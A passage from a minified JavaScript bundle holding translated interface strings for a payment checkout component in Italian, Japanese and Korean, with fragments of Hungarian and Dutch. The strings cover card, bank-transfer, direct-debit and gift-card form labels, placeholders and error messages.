kódhoz","ach.encryptedBankLocationId.aria.label":"Bankazonosító kód mezője"}}),qv=Object.freeze({__proto__:null,default:{payButton:"Paga","payButton.redirecting":"Reindirizzamento...",storeDetails:"Salva per il prossimo pagamento","creditCard.holderName":"Nome sulla carta","creditCard.holderName.placeholder":"J. Smith","creditCard.holderName.invalid":"Nome del titolare della carta non valido","creditCard.numberField.title":"Numero carta","creditCard.numberField.placeholder":"1234 5678 9012 3456","creditCard.expiryDateField.title":"Data di scadenza","creditCard.expiryDateField.placeholder":"MM/AA","creditCard.expiryDateField.month":"Mese","creditCard.expiryDateField.month.placeholder":"MM","creditCard.expiryDateField.year.placeholder":"AA","creditCard.expiryDateField.year":"Anno","creditCard.cvcField.title":"CVC / CVV","creditCard.cvcField.placeholder":"123","creditCard.storeDetailsButton":"Ricorda per la prossima volta","creditCard.cvcField.placeholder.4digits":"4 cifre","creditCard.cvcField.placeholder.3digits":"3 cifre","creditCard.taxNumber.placeholder":"AAMMGG/0123456789",installments:"Numero di rate",installmentOption:"%{partialValue} x%{times}",installmentOptionMonths:"%{times} mesi","installments.oneTime":"Pagamento una tantum","installments.installments":"Pagamento rateale","installments.revolving":"Pagamento ricorrente","sepaDirectDebit.ibanField.invalid":"Numero di conto non valido","sepaDirectDebit.nameField.placeholder":"A. Bianchi","sepa.ownerName":"Nome Intestatario Conto","sepa.ibanNumber":"Numero di conto (IBAN)","error.title":"Errore","error.subtitle.redirect":"Reindirizzamento non riuscito","error.subtitle.payment":"Pagamento non riuscito","error.subtitle.refused":"Pagamento respinto","error.message.unknown":"Si è verificato un errore sconosciuto","idealIssuer.selectField.title":"Banca","idealIssuer.selectField.placeholder":"Seleziona la banca","creditCard.success":"Pagamento riuscito",loading:"Caricamento in corso...",continue:"Continua",continueTo:"Procedi verso","wechatpay.timetopay":"Devi pagare %@","wechatpay.scanqrcode":"Scansiona il codice QR",personalDetails:"Dati personali",companyDetails:"Informazioni dell'azienda","companyDetails.name":"Ragione sociale","companyDetails.registrationNumber":"Numero di registrazione",socialSecurityNumber:"Numero di previdenza sociale",firstName:"Nome",infix:"Prefisso",lastName:"Cognome",mobileNumber:"Numero di cellulare","mobileNumber.invalid":"Numero di cellulare non valido",city:"Città",postalCode:"Codice postale",countryCode:"Codice nazionale",telephoneNumber:"Numero di telefono",dateOfBirth:"Data di nascita",shopperEmail:"Indirizzo e-mail",gender:"Sesso",male:"Uomo",female:"Donna",billingAddress:"Indirizzo di fatturazione",street:"Via",stateOrProvince:"Stato o provincia",country:"Paese",houseNumberOrName:"Numero civico",separateDeliveryAddress:"Specifica un indirizzo di consegna alternativo",deliveryAddress:"Indirizzo di consegna",zipCode:"CAP",apartmentSuite:"Appartamento/suite",provinceOrTerritory:"Provincia o territorio",cityTown:"Città",address:"Indirizzo",state:"Stato","field.title.optional":"(facoltativo)","creditCard.cvcField.title.optional":"CVC/CVV (facoltativo)","issuerList.wallet.placeholder":"Seleziona il tuo portafoglio",privacyPolicy:"Informativa sulla privacy","afterPay.agreement":"Accetto i %@ di AfterPay",paymentConditions:"termini di pagamento",openApp:"Apri l'app","voucher.readInstructions":"Leggi le istruzioni","voucher.introduction":"Grazie per il tuo acquisto, utilizza il seguente coupon per completare il pagamento.","voucher.expirationDate":"Data di scadenza","voucher.alternativeReference":"Riferimento alternativo","dragonpay.voucher.non.bank.selectField.placeholder":"Seleziona il tuo fornitore","dragonpay.voucher.bank.selectField.placeholder":"Seleziona la banca","voucher.paymentReferenceLabel":"Riferimento del pagamento","voucher.surcharge":"Include un sovrapprezzo di %@","voucher.introduction.doku":"Grazie per il tuo acquisto, utilizza i seguenti dati per completare il pagamento.","voucher.shopperName":"Nome dell'acquirente","voucher.merchantName":"Esercente","voucher.introduction.econtext":"Grazie per il tuo acquisto, utilizza i seguenti dati per completare il pagamento.","voucher.telephoneNumber":"Numero di telefono","voucher.shopperReference":"Riferimento dell'acquirente","voucher.collectionInstitutionNumber":"Codice identificativo del negozio","voucher.econtext.telephoneNumber.invalid":"Il numero di telefono deve essere di 10 o 11 cifre","boletobancario.btnLabel":"Genera Boleto","boleto.sendCopyToEmail":"Invia una copia alla mia e-mail","button.copy":"Copia","button.download":"Scarica","creditCard.storedCard.description.ariaLabel":"La carta memorizzata termina in %@","voucher.entity":"Entità",donateButton:"Dona",notNowButton:"Non ora",thanksForYourSupport:"Grazie per il tuo sostegno!",preauthorizeWith:"Preautorizza con",confirmPreauthorization:"Conferma preautorizzazione",confirmPurchase:"Conferma acquisto",applyGiftcard:"Riscatta",giftcardBalance:"Saldo del buono",deductedBalance:"Importo detratto","creditCard.pin.title":"Pin","creditCard.encryptedPassword.label":"Prime 2 cifre della password della carta","creditCard.encryptedPassword.placeholder":"12","creditCard.encryptedPassword.invalid":"Password non valida","creditCard.taxNumber.label":"Data di nascita del titolare della carta (AAMMGG) o numero di registrazione aziendale (10 cifre)","creditCard.taxNumber.labelAlt":"Numero di registrazione aziendale (10 cifre)","creditCard.taxNumber.invalid":"Data di nascita del titolare della carta o numero di registrazione aziendale non validi","storedPaymentMethod.disable.button":"Rimuovi","storedPaymentMethod.disable.confirmation":"Rimuovi il metodo di pagamento archiviato","storedPaymentMethod.disable.confirmButton":"Sì, rimuoverli","storedPaymentMethod.disable.cancelButton":"Cancella","ach.bankAccount":"Conto bancario","ach.accountHolderNameField.title":"Nome del titolare del conto","ach.accountHolderNameField.placeholder":"J. Smith","ach.accountHolderNameField.invalid":"Nome del titolare del conto non valido","ach.accountNumberField.title":"Numero di conto","ach.accountNumberField.invalid":"Numero di conto non valido","ach.accountLocationField.title":"Codice ABA","ach.accountLocationField.invalid":"Codice ABA non valido","select.state":"Seleziona stato","select.stateOrProvince":"Seleziona stato o provincia","select.provinceOrTerritory":"Seleziona provincia o territorio","select.country":"Seleziona paese","select.noOptionsFound":"Nessuna opzione trovata","select.filter.placeholder":"Cerca...","telephoneNumber.invalid":"Numero di telefono non valido",qrCodeOrApp:"o","paypal.processingPayment":"Elaborazione del pagamento in corso...",generateQRCode:"Genera codice QR","await.waitForConfirmation":"In attesa di conferma","mbway.confirmPayment":"Conferma il pagamento con l'app MB WAY","shopperEmail.invalid":"Indirizzo e-mail non valido","dateOfBirth.format":"GG/MM/AAAA","dateOfBirth.invalid":"Devi avere almeno 18 anni","blik.confirmPayment":"Apri l'app della tua banca per confermare il pagamento.","blik.invalid":"Inserisci 6 numeri","blik.code":"Codice a 6 cifre","blik.help":"Ottieni il codice dalla app della tua banca.","swish.pendingMessage":"In seguito alla scansione, lo stato della transazione può rimanere in sospeso per un massimo di 10 minuti. Un nuovo tentativo di pagamento durante questo lasso di tempo può comportare pagamenti multipli.","error.va.gen.01":"Campo incompleto","error.va.gen.02":"Campo non valido","error.va.sf-cc-num.01":"Numero carta non valido","error.va.sf-cc-num.03":"Tipo di carta non supportato","error.va.sf-cc-dat.01":"Carta troppo vecchia","error.va.sf-cc-dat.02":"Data troppo avanti nel futuro","error.va.sf-cc-dat.03":"La tua carta scade prima della data di check out","error.giftcard.no-balance":"Questo buono regalo ha un saldo pari a zero","error.giftcard.card-error":"Non abbiamo alcun buono regalo con questo numero nei nostri archivi","error.giftcard.currency-error":"I buono regalo sono validi solo nella valuta in cui sono state emessi","amazonpay.signout":"Esci da Amazon","amazonpay.changePaymentDetails":"Modifica i dettagli di pagamento","partialPayment.warning":"Seleziona un altro metodo di pagamento per pagare l'importo rimanente","partialPayment.remainingBalance":"Il saldo rimanente sarà di %{amount}","bankTransfer.beneficiary":"Beneficiario","bankTransfer.iban":"IBAN","bankTransfer.bic":"BIC","bankTransfer.reference":"Riferimento","bankTransfer.introduction":"Continua per creare un nuovo pagamento tramite bonifico bancario. Puoi utilizzare i dettagli nella schermata seguente per completare l'operazione.","bankTransfer.instructions":"Grazie per il tuo acquisto, utilizza i seguenti dati per completare il pagamento.","bacs.accountHolderName":"Nome del titolare del conto bancario","bacs.accountHolderName.invalid":"Nome del titolare del conto bancario non valido","bacs.accountNumber":"Numero di conto bancario","bacs.accountNumber.invalid":"Numero di conto bancario non valido","bacs.bankLocationId":"Sort code","bacs.bankLocationId.invalid":"Sort code non valido","bacs.consent.amount":"Accetto che l'importo sopra indicato venga detratto dal mio conto bancario.","bacs.consent.account":"Confermo che il conto è intestato al sottoscritto e che sono l'unico firmatario a dover autorizzare l'addebito diretto su questo conto.",edit:"Modifica","bacs.confirm":"Conferma e paga","bacs.result.introduction":"Scarica le Istruzioni per l'addebito diretto (DDI / Mandato)","download.pdf":"Scarica PDF","creditCard.encryptedCardNumber.aria.iframeTitle":"Iframe per numero di carta protetta","creditCard.encryptedCardNumber.aria.label":"Campo numero di carta","creditCard.encryptedExpiryDate.aria.iframeTitle":"Iframe data di scadenza per numero di carta protetta","creditCard.encryptedExpiryDate.aria.label":"Campo data di scadenza","creditCard.encryptedExpiryMonth.aria.iframeTitle":"Iframe mese di scadenza per numero di carta protetta","creditCard.encryptedExpiryMonth.aria.label":"Campo mese di scadenza","creditCard.encryptedExpiryYear.aria.iframeTitle":"Iframe anno di scadenza per numero di carta protetta","creditCard.encryptedExpiryYear.aria.label":"Campo anno di scadenza","creditCard.encryptedSecurityCode.aria.iframeTitle":"Iframe per codice di sicurezza della carta protetta","creditCard.encryptedSecurityCode.aria.label":"Campo codice di sicurezza","giftcard.encryptedCardNumber.aria.iframeTitle":"Iframe per numero di carta regalo protetta","giftcard.encryptedCardNumber.aria.label":"Campo numero carta regalo","giftcard.encryptedSecurityCode.aria.iframeTitle":"Iframe per codice di sicurezza della carta regalo protetta","giftcard.encryptedSecurityCode.aria.label":"Campo codice di sicurezza della carta regalo",giftcardTransactionLimit:"Importo massimo di %{amount} per transazione su questo buono regalo","ach.encryptedBankAccountNumber.aria.iframeTitle":"Iframe per numero di numero di conto bancario protetto","ach.encryptedBankAccountNumber.aria.label":"Campo conto bancario","ach.encryptedBankLocationId.aria.iframeTitle":"Iframe per numero di routing bancario sicuro","ach.encryptedBankLocationId.aria.label":"Campo numero di routing bancario"}}),Xv=Object.freeze({__proto__:null,default:{payButton:"支払う","payButton.redirecting":"リダイレクトしています...",storeDetails:"次回のお支払いのため詳細を保存","creditCard.holderName":"カード上の名前","creditCard.holderName.placeholder":"Taro Yamada","creditCard.holderName.invalid":"無効なカード所有者名","creditCard.numberField.title":"カード番号","creditCard.numberField.placeholder":"1234 5678 9012 3456","creditCard.expiryDateField.title":"有効期限","creditCard.expiryDateField.placeholder":"MM/YY","creditCard.expiryDateField.month":"月","creditCard.expiryDateField.month.placeholder":"MM","creditCard.expiryDateField.year.placeholder":"YY","creditCard.expiryDateField.year":"年","creditCard.cvcField.title":"セキュリティーコード (CVC)","creditCard.cvcField.placeholder":"123","creditCard.storeDetailsButton":"次回のために保存します","creditCard.cvcField.placeholder.4digits":"4桁","creditCard.cvcField.placeholder.3digits":"3桁","creditCard.taxNumber.placeholder":"年月日（YYMMDD）/ 0123456789",installments:"分割回数",installmentOption:"%{times}x %{partialValue}",installmentOptionMonths:"%{times}か月","installments.oneTime":"一括払い","installments.installments":"分割払い","installments.revolving":"リボ払い","sepaDirectDebit.ibanField.invalid":"口座番号の入力間違い","sepaDirectDebit.nameField.placeholder":"J. Smith","sepa.ownerName":"名義","sepa.ibanNumber":"口座番号 (IBAN)","error.title":"エラー","error.subtitle.redirect":"画面の切り替え失敗にしました","error.subtitle.payment":"支払できませんでした","error.subtitle.refused":"カード会社で取引が承認されませんでした。","error.message.unknown":"不明なエラーが発生しました","idealIssuer.selectField.title":"銀行","idealIssuer.selectField.placeholder":"銀行を選択してください","creditCard.success":"認証が成功しました",loading:"読み込んでいます...",continue:"続ける",continueTo:"次へ進む：","wechatpay.timetopay":"%@をお支払い下さい。","wechatpay.scanqrcode":"QR コードをスキャンする",personalDetails:"個人情報",companyDetails:"会社情報","companyDetails.name":"会社名","companyDetails.registrationNumber":"登録番号",socialSecurityNumber:"ソーシャルセキュリティー番号",firstName:"名",infix:"敬称",lastName:"姓",mobileNumber:"携帯番号","mobileNumber.invalid":"無効な携帯電話番号",city:"市区",postalCode:"郵便番号",countryCode:"国コード",telephoneNumber:"電話番号",dateOfBirth:"生年月日",shopperEmail:"Eメールアドレス",gender:"性別",male:"男性",female:"女性",billingAddress:"ご請求住所",street:"番地",stateOrProvince:"都道府県",country:"国",houseNumberOrName:"部屋番号",separateDeliveryAddress:"別の配送先住所を指定してください",deliveryAddress:"配送先住所",zipCode:"郵便番号",apartmentSuite:"アパート名/部屋名",provinceOrTerritory:"州または準州",cityTown:"市区町村",address:"住所",state:"都道府県","field.title.optional":"（任意）","creditCard.cvcField.title.optional":"セキュリティーコード(任意)","issuerList.wallet.placeholder":"ウォレットを選択してください",privacyPolicy:"プライバシーポリシー","afterPay.agreement":"AfterPayの%@で同意",paymentConditions:"支払条件",openApp:"アプリを開く","voucher.readInstructions":"手順を参照してください","voucher.introduction":"お買い上げありがとうございます。以下のクーポンを使用して、お支払いを完了してください。","voucher.expirationDate":"有効期限","voucher.alternativeReference":"別の参照","dragonpay.voucher.non.bank.selectField.placeholder":"プロバイダーを選択してください","dragonpay.voucher.bank.selectField.placeholder":"銀行を選択してください","voucher.paymentReferenceLabel":"支払の参照","voucher.surcharge":"%@ の追加料金を含む","voucher.introduction.doku":"お買い上げありがとうございます。以下の情報を使用して、お支払いを完了してください。","voucher.shopperName":"購入者氏名","voucher.merchantName":"業者","voucher.introduction.econtext":"お買い上げありがとうございます。以下の情報を使用して、お支払いを完了してください。","voucher.telephoneNumber":"電話番号","voucher.shopperReference":"購入者向け参考情報","voucher.collectionInstitutionNumber":"収納機関番号","voucher.econtext.telephoneNumber.invalid":"電話番号は10桁または11桁にしてください","boletobancario.btnLabel":"Boletoを生成する","boleto.sendCopyToEmail":"自分のメールアドレスにコピーを送信する","button.copy":"コピー","button.download":"ダウンロード","creditCard.storedCard.description.ariaLabel":"保存されたカードは％@に終了します","voucher.entity":"エンティティ",donateButton:"寄付する",notNowButton:"今はしない",thanksForYourSupport:"ご支援いただきありがとうございます。",preauthorizeWith:"次で事前認証する：",confirmPreauthorization:"事前承認を確認する",confirmPurchase:"購入を確認する",applyGiftcard:"利用する",giftcardBalance:"ギフトカードの残高",deductedBalance:"差し引き後残高","creditCard.pin.title":"PIN","creditCard.encryptedPassword.label":"カードのパスワードの最初の2桁","creditCard.encryptedPassword.placeholder":"12","creditCard.encryptedPassword.invalid":"パスワードが無効です","creditCard.taxNumber.label":"カード所有者の生年月日（YYMMDD）または法人登録番号（10桁）","creditCard.taxNumber.labelAlt":"法人登録番号（10桁）","creditCard.taxNumber.invalid":"カード所有者の生年月日または法人登録番号が無効です","storedPaymentMethod.disable.button":"削除","storedPaymentMethod.disable.confirmation":"保存されている支払方法を削除する","storedPaymentMethod.disable.confirmButton":"はい、削除します","storedPaymentMethod.disable.cancelButton":"キャンセル","ach.bankAccount":"銀行口座","ach.accountHolderNameField.title":"口座名義","ach.accountHolderNameField.placeholder":"Taro Yamada","ach.accountHolderNameField.invalid":"無効な口座名義","ach.accountNumberField.title":"口座番号","ach.accountNumberField.invalid":"口座番号の入力間違い","ach.accountLocationField.title":"ABAナンバー","ach.accountLocationField.invalid":"無効なABAナンバー","select.state":"都道府県を選択してください","select.stateOrProvince":"都道府県を選択してください","select.provinceOrTerritory":"州または準州を選択してください","select.country":"国を選択してください","select.noOptionsFound":"オプションが見つかりませんでした","select.filter.placeholder":"検索...","telephoneNumber.invalid":"無効な電話番号",qrCodeOrApp:"または","paypal.processingPayment":"支払いを処理しています...",generateQRCode:"QRコードを生成する","await.waitForConfirmation":"確認を待っています","mbway.confirmPayment":"MB WAYアプリで支払を確認する","shopperEmail.invalid":"Eメールアドレスが無効です","dateOfBirth.format":"DD/MM/YYYY","dateOfBirth.invalid":"18歳以上の方のみご利用いただけます","blik.confirmPayment":"バンキングアプリを開いて、支払を確認してください。","blik.invalid":"6つの数字を入力してください","blik.code":"6桁のコード","blik.help":"バンキングアプリからコードを取得してください。","swish.pendingMessage":"スキャン後、ステータスは最大10分間保留状態になります。この間に再度お支払いいただこうとすると、複数の請求が発生する場合があります。","error.va.gen.01":"不完全なフィールド","error.va.gen.02":"フィールドが無効です","error.va.sf-cc-num.01":"カード番号が無効です","error.va.sf-cc-num.03":"サポートされていないカードが入力されました","error.va.sf-cc-dat.01":"カードが古すぎます","error.va.sf-cc-dat.02":"未来の日付が先すぎです","error.va.sf-cc-dat.03":"チェックアウト日より前にカードの有効期限が切れます","error.giftcard.no-balance":"このギフトカードの残高はゼロです","error.giftcard.card-error":"記録では、この番号のギフトカードはありません","error.giftcard.currency-error":"ギフトカードは、発行された通貨でのみ有効です。","amazonpay.signout":"Amazonからサインアウトする","amazonpay.changePaymentDetails":"支払明細を変更する","partialPayment.warning":"残金を支払う別の支払方法を選択してください","partialPayment.remainingBalance":"残りの残高は%{amount}になります","bankTransfer.beneficiary":"受益者","bankTransfer.iban":"IBAN","bankTransfer.bic":"BIC","bankTransfer.reference":"参照","bankTransfer.introduction":"新しい銀行振込によるお支払の作成を続行します。次の画面の詳細を使用して、このお支払いを確定できます。","bankTransfer.instructions":"お買い上げありがとうございます。以下の情報を使用して、お支払いを完了してください。","bacs.accountHolderName":"銀行口座名義","bacs.accountHolderName.invalid":"銀行口座名義が無効です","bacs.accountNumber":"銀行口座番号","bacs.accountNumber.invalid":"銀行口座番号が無効です","bacs.bankLocationId":"ソートコード","bacs.bankLocationId.invalid":"ソートコードが無効です","bacs.consent.amount":"上記の金額が私の銀行口座から引き落とされることに同意します。","bacs.consent.account":"口座が私の名義であることを確認し、この口座からの自動引き落としを承認するために必要な唯一の署名者であることを確認します。",edit:"編集","bacs.confirm":"確認して支払う","bacs.result.introduction":"自動引き落としの説明 (DDI/委任状) をダウンロードする","download.pdf":"PDFをダウンロード","creditCard.encryptedCardNumber.aria.iframeTitle":"保護されたカード番号の iframe","creditCard.encryptedCardNumber.aria.label":"カード番号フィールド","creditCard.encryptedExpiryDate.aria.iframeTitle":"保護されたカードの有効期限日の iframe","creditCard.encryptedExpiryDate.aria.label":"有効期限日フィールド","creditCard.encryptedExpiryMonth.aria.iframeTitle":"保護されたカードの有効期限月の iframe","creditCard.encryptedExpiryMonth.aria.label":"有効期限月フィールド","creditCard.encryptedExpiryYear.aria.iframeTitle":"保護されたカードの有効期限年の iframe","creditCard.encryptedExpiryYear.aria.label":"有効期限年フィールド","creditCard.encryptedSecurityCode.aria.iframeTitle":"保護されたカードのセキュリティコードの iframe","creditCard.encryptedSecurityCode.aria.label":"セキュリティコードフィールド","giftcard.encryptedCardNumber.aria.iframeTitle":"保護されたギフトカード番号の iframe","giftcard.encryptedCardNumber.aria.label":"ギフトカード番号フィールド","giftcard.encryptedSecurityCode.aria.iframeTitle":"保護されたギフトカードのセキュリティコードの iframe","giftcard.encryptedSecurityCode.aria.label":"ギフトカードのセキュリティコードフィールド",giftcardTransactionLimit:"このギフトカードでの取引ごとに許可される最大%{amount}","ach.encryptedBankAccountNumber.aria.iframeTitle":"保護された銀行口座番号の iframe","ach.encryptedBankAccountNumber.aria.label":"銀行口座フィールド","ach.encryptedBankLocationId.aria.iframeTitle":"保護された銀行支店番号の iframe","ach.encryptedBankLocationId.aria.label":"銀行支店番号フィールド"}}),Yv=Object.freeze({__proto__:null,default:{payButton:"결제","payButton.redirecting":"리디렉션 중...",storeDetails:"다음 결제를 위해 이 수단 저장","creditCard.holderName":"카드상의 이름","creditCard.holderName.placeholder":"J. Smith","creditCard.holderName.invalid":"유효하지 않은 카드 소유자 이름","creditCard.numberField.title":"카드 번호","creditCard.numberField.placeholder":"1234 5678 9012 3456","creditCard.expiryDateField.title":"만료일","creditCard.expiryDateField.placeholder":"MM/YY","creditCard.expiryDateField.month":"월","creditCard.expiryDateField.month.placeholder":"MM","creditCard.expiryDateField.year.placeholder":"YY","creditCard.expiryDateField.year":"연도","creditCard.cvcField.title":"CVC / CVV","creditCard.cvcField.placeholder":"123","creditCard.storeDetailsButton":"다음을 위해 저장","creditCard.cvcField.placeholder.4digits":"4자리","creditCard.cvcField.placeholder.3digits":"3자리","creditCard.taxNumber.placeholder":"YYMMDD / 0123456789",installments:"할부 개월 수",installmentOption:"%{times}x %{partialValue}",installmentOptionMonths:"%{times}개월","installments.oneTime":"일시불 결제","installments.installments":"할부 결제","installments.revolving":"리볼빙 결제","sepaDirectDebit.ibanField.invalid":"유효하지 않은 계좌 번호","sepaDirectDebit.nameField.placeholder":"J. Smith","sepa.ownerName":"소유자 이름","sepa.ibanNumber":"계좌 번호(IBAN)","error.title":"오류","error.subtitle.redirect":"리디렉션 실패","error.subtitle.payment":"결제 실패","error.subtitle.refused":"결제 거부","error.message.unknown":"알 수 없는 오류 발생","idealIssuer.selectField.title":"은행","idealIssuer.selectField.placeholder":"은행 선택","creditCard.success":"결제 성공",loading:"로드 중…",continue:"계속",continueTo:"다음으로 계속:","wechatpay.timetopay":"남은 결제 시한: %@","wechatpay.scanqrcode":"QR 코드 스캔",personalDetails:"개인 정보",companyDetails:"회사 정보","companyDetails.name":"회사명","companyDetails.registrationNumber":"등록 번호",socialSecurityNumber:"사회 보장 번호(주민등록번호)",firstName:"이름",infix:"명칭",lastName:"성",mobileNumber:"휴대폰 번호","mobileNumber.invalid":"유효하지 않은 휴대폰 번호",city:"시",postalCode:"우편번호",countryCode:"국가 코드",telephoneNumber:"전화번호",dateOfBirth:"생년월일",shopperEmail:"이메일 주소",gender:"성별",male:"남성",female:"여성",billingAddress:"청구지 주소",street:"도로명",stateOrProvince:"주/도",country:"국가",houseNumberOrName:"집 전화번호",separateDeliveryAddress:"배송 주소 별도 지정",deliveryAddress:"배송 주소",zipCode:"우편번호",apartmentSuite:"아파트/건물",provinceOrTerritory:"도",cityTown:"시/구",address:"주소",state:"주","field.title.optional":"(선택 사항)","creditCard.cvcField.title.optional":"CVC / CVV (선택)","issuerList.wallet.placeholder":"전자 지갑 선택",privacyPolicy:"개인정보 보호정책","afterPay.agreement":"AfterPay의 %@에 동의합니다.",paymentConditions:"결제 조건",openApp:"앱 열기","voucher.readInstructions":"안내 읽기","voucher.introduction":"구매해 주셔서 감사합니다. 다음 쿠폰을 사용하여 결제를 완료하십시오.","voucher.expirationDate":"만료일","voucher.alternativeReference":"대체 참조번호","dragonpay.voucher.non.bank.selectField.placeholder":"제공 업체 선택","dragonpay.voucher.bank.selectField.placeholder":"은행 선택","voucher.paymentReferenceLabel":"결제 참조번호","voucher.surcharge":"%@ 할증료 포함","voucher.introduction.doku":"구매해 주셔서 감사합니다. 다음 정보를 이용하여 결제를 완료하십시오.","voucher.shopperName":"구매자 이름","voucher.merchantName":"가맹점","voucher.introduction.econtext":"구매해 주셔서 감사합니다. 다음 정보를 이용하여 결제를 완료하십시오.","voucher.telephoneNumber":"전화번호","voucher.shopperReference":"구매자 참조번호","voucher.collectionInstitutionNumber":"수금 기관 번호","voucher.econtext.telephoneNumber.invalid":"전화번호는 10자리 또는 11자리 숫자여야 합니다","boletobancario.btnLabel":"Boleto 생성","boleto.sendCopyToEmail":"내 이메일로 사본 보내기","button.copy":"복사","button.download":"다운로드","creditCard.storedCard.description.ariaLabel":"저장된 카드는 %@ 후 종료됩니다.","voucher.entity":"발급사",donateButton:"기부하기",notNowButton:"다음에 하기",thanksForYourSupport:"도와주셔서 감사합니다!",preauthorizeWith:"사전 승인 방법:",confirmPreauthorization:"사전 승인 확인",confirmPurchase:"구매 확인",applyGiftcard:"기프트 카드로 결제",giftcardBalance:"기프트 카드 잔액",deductedBalance:"공제 잔액","creditCard.pin.title":"비밀번호","creditCard.encryptedPassword.label":"카드 비밀번호 첫 2자리","creditCard.encryptedPassword.placeholder":"12","creditCard.encryptedPassword.invalid":"유효하지 않은 번호","creditCard.taxNumber.label":"카드 소유자 생년월일(예: 870130) 또는 법인 등록 번호(10자리)","creditCard.taxNumber.labelAlt":"법인 등록 번호(10자리)","creditCard.taxNumber.invalid":"유효하지 않은 카드 소유자 생년월일 또는 법인 등록 번호","storedPaymentMethod.disable.button":"삭제","storedPaymentMethod.disable.confirmation":"저장된 결제 수단 삭제","storedPaymentMethod.disable.confirmButton":"예, 삭제합니다","storedPaymentMethod.disable.cancelButton":"취소","ach.bankAccount":"은행 계좌","ach.accountHolderNameField.title":"계좌 소유자 이름","ach.accountHolderNameField.placeholder":"J. Smith","ach.accountHolderNameField.invalid":"유효하지 않은 계좌 소유자 이름","ach.accountNumberField.title":"계좌 번호","ach.accountNumberField.invalid":"유효하지 않은 계좌 번호","ach.accountLocationField.title":"ABA 라우팅 번호","ach.accountLocationField.invalid":"유효하지 않은 ABA 라우팅 번호","select.state":"주 선택","select.stateOrProvince":"주/도 선택","select.provinceOrTerritory":"도 선택","select.country":"국가 선택","select.noOptionsFound":"검색된 옵션 없음","select.filter.placeholder":"검색...","telephoneNumber.invalid":"유효하지 않은 전화번호",qrCodeOrApp:"또는","paypal.processingPayment":"결제 처리 중...",generateQRCode:"QR 코드 생성","await.waitForConfirmation":"확인 대기중","mbway.confirmPayment":"MB WAY 앱에서 결제를 확인하십시오","shopperEmail.invalid":"유효하지 않은 이메일 주소","dateOfBirth.format":"DD(일)/MM(월)/YYYY(연도)","dateOfBirth.invalid":"최소 18세 이상이어야 합니다","blik.confirmPayment":"뱅킹 앱을 열어서 결제를 확인하세요.","blik.invalid":"6자리 숫자 입력","blik.code":"6자리 코드","blik.help":"뱅킹 앱에서 코드를 가져오세요.","swish.pendingMessage":"스캔 후 최대 10분 동안 상태가 보류될 수 있습니다. 10분 내에 다시 시도할 경우 금액이 여러 번 청구될 수 있습니다.","error.va.gen.01":"미완료 필드","error.va.gen.02":"필드가 유효하지 않습니다","error.va.sf-cc-num.01":"유효하지 않은 카드 번호입니다","error.va.sf-cc-num.03":"지원되지 않는 카드가 입력되었습니다","error.va.sf-cc-dat.01":"카드가 너무 오래되었습니다","error.va.sf-cc-dat.02":"현재로부터 너무 먼 날짜입니다","error.va.sf-cc-dat.03":"귀하의 카드가 결제일 전에 만료됩니다.","error.giftcard.no-balance":"이 기프트 카드에는 잔액이 없습니다","error.giftcard.card-error":"이 기프트 카드 번호는 당사에 등록되어 있지 않습니다","error.giftcard.currency-error":"기프트 카드는 발급된 통화로만 사용하실 수 있습니다","amazonpay.signout":"Amazon에서 로그아웃","amazonpay.changePaymentDetails":"결제 정보 변경","partialPayment.warning":"나머지 비용 지불에 사용할 다른 결제 수단 선택하기","partialPayment.remainingBalance":"남은 잔액은 %{amount}입니다","bankTransfer.beneficiary":"수령인","bankTransfer.iban":"IBAN","bankTransfer.bic":"BIC","bankTransfer.reference":"참조 번호","bankTransfer.introduction":"새 계좌 이체 건을 계속 진행합니다. 다음 화면에 나오는 정보를 이용해 이체를 완료하실 수 있습니다.","bankTransfer.instructions":"구매해 주셔서 감사합니다. 다음 정보를 이용하여 결제를 완료하십시오.","bacs.accountHolderName":"예금주 이름","bacs.accountHolderName.invalid":"예금주 이름이 유효하지 않습니다","bacs.accountNumber":"계좌 번호","bacs.accountNumber.invalid":"계좌 번호가 유효하지 않습니다","bacs.bankLocationId":"은행 식별 코드","bacs.bankLocationId.invalid":"은행 식별 코드가 유효하지 않습니다","bacs.consent.amount":"계좌에서 위의 금액을 이체하는 것에 동의합니다.","bacs.consent.account":"본인이 이 계좌의 예금주이며, 이 계좌에서의 자동 이체를 승인하기 위해 필요한 유일한 서명인입니다.",edit:"수정","bacs.confirm":"확인 및 결제","bacs.result.introduction":"자동 이체 안내(DDI/필수) 다운로드","download.pdf":"PDF 다운로드","creditCard.encryptedCardNumber.aria.iframeTitle":"카드 번호 보안을 위한 Iframe","creditCard.encryptedCardNumber.aria.label":"카드 번호 입력란","creditCard.encryptedExpiryDate.aria.iframeTitle":"카드 만료 날짜 보안을 위한 Iframe","creditCard.encryptedExpiryDate.aria.label":"만료 날짜 입력란","creditCard.encryptedExpiryMonth.aria.iframeTitle":"카드 만료 월 보안을 위한 Iframe","creditCard.encryptedExpiryMonth.aria.label":"만료 월 입력란","creditCard.encryptedExpiryYear.aria.iframeTitle":"카드 만료 연도 보안을 위한 Iframe","creditCard.encryptedExpiryYear.aria.label":"만료 연도 입력란","creditCard.encryptedSecurityCode.aria.iframeTitle":"카드 보안 코드 보안을 위한 Iframe","creditCard.encryptedSecurityCode.aria.label":"보안 코드 입력란","giftcard.encryptedCardNumber.aria.iframeTitle":"기프트 카드 번호 보안을 위한 Iframe","giftcard.encryptedCardNumber.aria.label":"기프트 카드 번호 입력란","giftcard.encryptedSecurityCode.aria.iframeTitle":"기프트 카드 보안 코드 보안을 위한 Iframe","giftcard.encryptedSecurityCode.aria.label":"기프트 카드 보안 코드 입력란",giftcardTransactionLimit:"이 기프트카드로 건당 결제 가능한 최고 액수는 %{amount}","ach.encryptedBankAccountNumber.aria.iframeTitle":"은행 계좌 번호 보안을 위한 Iframe","ach.encryptedBankAccountNumber.aria.label":"은행 계좌 입력란","ach.encryptedBankLocationId.aria.iframeTitle":"은행 라우팅 번호 보안을 위한 Iframe","ach.encryptedBankLocationId.aria.label":"은행 라우팅 번호 입력란"}}),Jv=Object.freeze({__proto__:null,default:{payButton:"Betaal","payButton.redirecting":"U wordt doorverwezen...",storeDetails:"Bewaar voor mijn volgende betaling","creditCard.holderName":"Naam op kaart","creditCard.holderName.placeholder":"J. Janssen","creditCard.holderName.invalid":"Ongeldige naam kaarthouder","creditCard.numberField.title":"Kaartnummer","creditCard.numberField.placeholder":"1234 5678 9012 